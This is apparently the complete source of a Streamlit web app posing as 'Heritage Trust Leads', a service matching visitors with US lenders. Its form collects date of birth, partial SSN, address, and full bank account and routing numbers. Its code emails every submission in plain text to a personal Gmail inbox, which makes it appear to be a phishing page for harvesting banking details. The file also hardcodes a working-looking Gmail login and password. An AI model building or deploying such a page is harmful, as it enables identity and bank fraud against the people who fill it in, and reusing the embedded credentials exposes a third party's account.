import streamlit as st
import pandas as pd
import datetime
import hashlib
import uuid
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# ============================================
# PAGE CONFIG
# ============================================
st.set_page_config(
    page_title="Heritage Trust Leads",
    page_icon="🇺🇸",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ============================================
# HIDE STREAMLIT UI
# ============================================
st.markdown("""
<style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stAppDeployButton {display: none;}
    .stActionButton {display: none;}
    .stToolbar {display: none;}
    .stStatusWidget {display: none;}
</style>
""", unsafe_allow_html=True)

# ============================================
# CONFIGURATION
# ============================================
COMPANY_NAME = "Heritage Trust Leads"
COMPANY_PHONE = "(225) 244-9281"
COMPANY_WHATSAPP = "941 879 6129"
COMPANY_EMAIL = "turnerjack779@gmail.com"

ADMIN_EMAIL = "turnerjack779@gmail.com"
ADMIN_PASSWORD = "Wasu1234$"

# Email config
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USERNAME = "turnerjack779@gmail.com"
SMTP_PASSWORD = "Wasu1234$"

US_STATES = [
    "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
    "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky",
    "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
    "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico",
    "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
    "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont",
    "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
]

LOAN_PROVIDERS = [
    "Any Lender", "Wells Fargo", "Chase Bank", "Bank of America", "CitiBank",
    "U.S. Bank", "PNC Bank", "Capital One", "SoFi", "LendingClub"
]

LOAN_TYPES = [
    "Personal Loan", "Home Loan", "Auto Loan", "Business Loan", 
    "Student Loan", "Debt Consolidation", "Credit Card"
]

# ============================================
# DATABASE
# ============================================
if 'leads' not in st.session_state:
    st.session_state.leads = []

if 'users' not in st.session_state:
    st.session_state.users = {
        ADMIN_EMAIL: {
            "password": hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest(),
            "user_type": "admin",
            "name": "Admin"
        }
    }

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
    st.session_state.user_data = None

if 'show_login' not in st.session_state:
    st.session_state.show_login = False

# ============================================
# FUNCTIONS
# ============================================
def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def validate_phone(phone):
    phone_clean = re.sub(r'[^\d]', '', phone)
    return len(phone_clean) == 10

def validate_zip(zip_code):
    return re.match(r'^\d{5}$', zip_code) is not None

def validate_routing(routing):
    return re.match(r'^\d{9}$', routing) is not None

def validate_account(account):
    return len(account) >= 8 and account.isdigit()

def get_client_ip():
    try:
        import requests
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

def send_email_alert(lead_data):
    try:
        msg = MIMEMultipart()
        msg['From'] = COMPANY_EMAIL
        msg['To'] = COMPANY_EMAIL
        msg['Subject'] = f"🔔 NEW LEAD: {lead_data['name']} - ${lead_data['loan_amount']:,}"

        body = f"""
NEW LEAD RECEIVED!

Lead ID: {lead_data['lead_id']}
Date: {lead_data['timestamp']}

CUSTOMER DETAILS:
Name: {lead_data['name']}
Email: {lead_data['email']}
Phone: {lead_data['phone']}
SSN (Last 4): ***-**-{lead_data['ssn_last4']}
DOB: {lead_data['dob']}

ADDRESS:
{lead_data['address']}
{lead_data['city']}, {lead_data['state']} {lead_data['zip']}

BANK DETAILS:
Bank: {lead_data['bank_name']}
Account: {lead_data['account_number']}
Routing: {lead_data['routing_number']}

LOAN DETAILS:
Lender: {lead_data['loan_provider']}
Type: {lead_data['loan_type']}
Amount: ${lead_data['loan_amount']:,}
Employment: {lead_data['employment']}
Income: ${lead_data['income']:,}

IP: {lead_data['ip']}
"""
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except:
        return False

def capture_lead(data):
    lead_id = str(uuid.uuid4())[:8]
    lead = {
        'lead_id': lead_id,
        'name': data['name'],
        'email': data['email'],
        'phone': data['phone'],
        'ssn_last4': data['ssn_last4'],
        'dob': data['dob'],
        'address': data['address'],
        'city': data['city'],
        'state': data['state'],
        'zip': data['zip'],
        'bank_name': data['bank_name'],
        'account_number': data['account_number'],
        'routing_number': data['routing_number'],
        'loan_provider': data['loan_provider'],
        'loan_type': data['loan_type'],
        'loan_amount': data['loan_amount'],
        'employment': data['employment'],
        'income': data['income'],
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': get_client_ip()
    }
    st.session_state.leads.insert(0, lead)
    send_email_alert(lead)
    return lead

# ============================================
# LEAD FORM
# ============================================
def show_lead_form():
    st.markdown(f"""
    <div style="text-align: center; margin-bottom: 2rem;">
        <h1 style="color: #1e4a6e;">🏛️ {COMPANY_NAME}</h1>
        <p style="color: #666;">We match you with trusted US lenders</p>
        <p style="color: #ff9800;">One application. Multiple offers. Best rates.</p>
    </div>
    """, unsafe_allow_html=True)
    
    with st.form("lead_form"):
        col1, col2 = st.columns(2)
        
        with col1:
            st.markdown("### Personal Info")
            name = st.text_input("Full Name *")
            email = st.text_input("Email *")
            phone = st.text_input("Phone *")
            ssn_last4 = st.text_input("SSN (Last 4) *", max_chars=4, type="password")
            dob = st.date_input("Date of Birth *", min_value=datetime(1920, 1, 1), max_value=datetime(2006, 1, 1))
        
        with col2:
            st.markdown("### Address")
            address = st.text_input("Street Address *")
            city = st.text_input("City *")
            state = st.selectbox("State *", US_STATES)
            zip_code = st.text_input("ZIP Code *")
        
        st.markdown("---")
        st.markdown("### 🏦 Bank Information")
        
        col1, col2 = st.columns(2)
        with col1:
            bank_name = st.text_input("Bank Name *")
            account_number = st.text_input("Account Number *", type="password")
        with col2:
            routing_number = st.text_input("Routing Number *", type="password")
        
        st.markdown("---")
        st.markdown("### 💰 Loan Details")
        
        col1, col2 = st.columns(2)
        with col1:
            loan_provider = st.selectbox("Preferred Lender", LOAN_PROVIDERS)
            loan_type = st.selectbox("Loan Type", LOAN_TYPES)
        with col2:
            loan_amount = st.number_input("Loan Amount ($)", min_value=1000, max_value=100000, value=10000, step=1000)
            employment = st.selectbox("Employment", ["Employed Full-Time", "Employed Part-Time", "Self-Employed", "Retired"])
            income = st.number_input("Annual Income ($)", min_value=0, max_value=500000, value=50000, step=5000)
        
        st.markdown("---")
        consent = st.checkbox("I agree to receive loan offers from partner lenders *")
        
        submitted = st.form_submit_button("Submit Application", use_container_width=True, type="primary")
        
        if submitted:
            errors = []
            if not name: errors.append("Name")
            if not email: errors.append("Email")
            if not validate_phone(phone): errors.append("Valid phone (10 digits)")
            if not ssn_last4 or len(ssn_last4) != 4: errors.append("SSN last 4 digits")
            if not validate_zip(zip_code): errors.append("Valid ZIP code")
            if not bank_name: errors.append("Bank name")
            if not validate_account(account_number): errors.append("Valid account number")
            if not validate_routing(routing_number): errors.append("Valid routing number")
            if not consent: errors.append("Consent required")
            
            if errors:
                st.error(f"Please fix: {', '.join(errors)}")
            else:
                lead_data = {
                    'name': name, 'email': email, 'phone': phone, 'ssn_last4': ssn_last4, 'dob': str(dob),
                    'address': address, 'city': city, 'state': state, 'zip': zip_code,
                    'bank_name': bank_name, 'account_number': account_number, 'routing_number': routing_number,
                    'loan_provider': loan_provider, 'loan_type': loan_type, 'loan_amount': loan_amount,
                    'employment': employment, 'income': income, 'consent': True
                }
                capture_lead(lead_data)
                st.success(f"✅ Thank you {name}! Lenders will contact you soon.")
                st.balloons()

# ============================================
# LOGIN
# ============================================
def show_login():
    st.markdown(f"""
    <div style="text-align: center; margin-bottom: 2rem;">
        <h1 style="color: #1e4a6e;">🏛️ {COMPANY_NAME}</h1>
        <p style="color: #666;">Partner Portal</p>
    </div>
    """, unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        with st.form("login_form"):
            email = st.text_input("Email")
            password = st.text_input("Password", type="password")
            if st.form_submit_button("Login", use_container_width=True):
                if email in st.session_state.users and st.session_state.users[email]["password"] == hash_password(password):
                    st.session_state.logged_in = True
                    st.session_state.show_login = False
                    st.rerun()
                else:
                    st.error("Invalid credentials")

# ============================================
# ADMIN DASHBOARD
# ============================================
def show_admin_dashboard():
    st.markdown(f"""
    <div style="text-align: center; margin-bottom: 2rem;">
        <h1 style="color: #1e4a6e;">👑 Admin Dashboard</h1>
        <p style="color: #666;">Total Leads: {len(st.session_state.leads)}</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.session_state.leads:
        df = pd.DataFrame(st.session_state.leads)
        st.dataframe(df, use_container_width=True)
        
        if st.button("📥 Export CSV"):
            csv = df.to_csv(index=False)
            st.download_button("Download", csv, "leads.csv", "text/csv")
    else:
        st.info("No leads yet")

# ============================================
# SIDEBAR
# ============================================
with st.sidebar:
    st.markdown(f"""
    <div style="text-align: center;">
        <h3>🏛️ {COMPANY_NAME}</h3>
        <p style="font-size: 0.8rem;">US Lead Generation</p>
        <hr>
    </div>
    """, unsafe_allow_html=True)
    
    if st.session_state.logged_in:
        if st.button("🚪 Logout", use_container_width=True):
            st.session_state.logged_in = False
            st.rerun()
    else:
        if st.button("🔐 Admin Login", use_container_width=True):
            st.session_state.show_login = True
            st.rerun()
    
    st.markdown("---")
    st.markdown(f"""
    <div style="font-size: 0.7rem; text-align: center;">
        📞 {COMPANY_PHONE}<br>
        💬 {COMPANY_WHATSAPP}<br>
        📧 {COMPANY_EMAIL}
    </div>
    """, unsafe_allow_html=True)

# ============================================
# MAIN
# ============================================
if st.session_state.logged_in:
    show_admin_dashboard()
elif st.session_state.show_login:
    show_login()
else:
    show_lead_form()
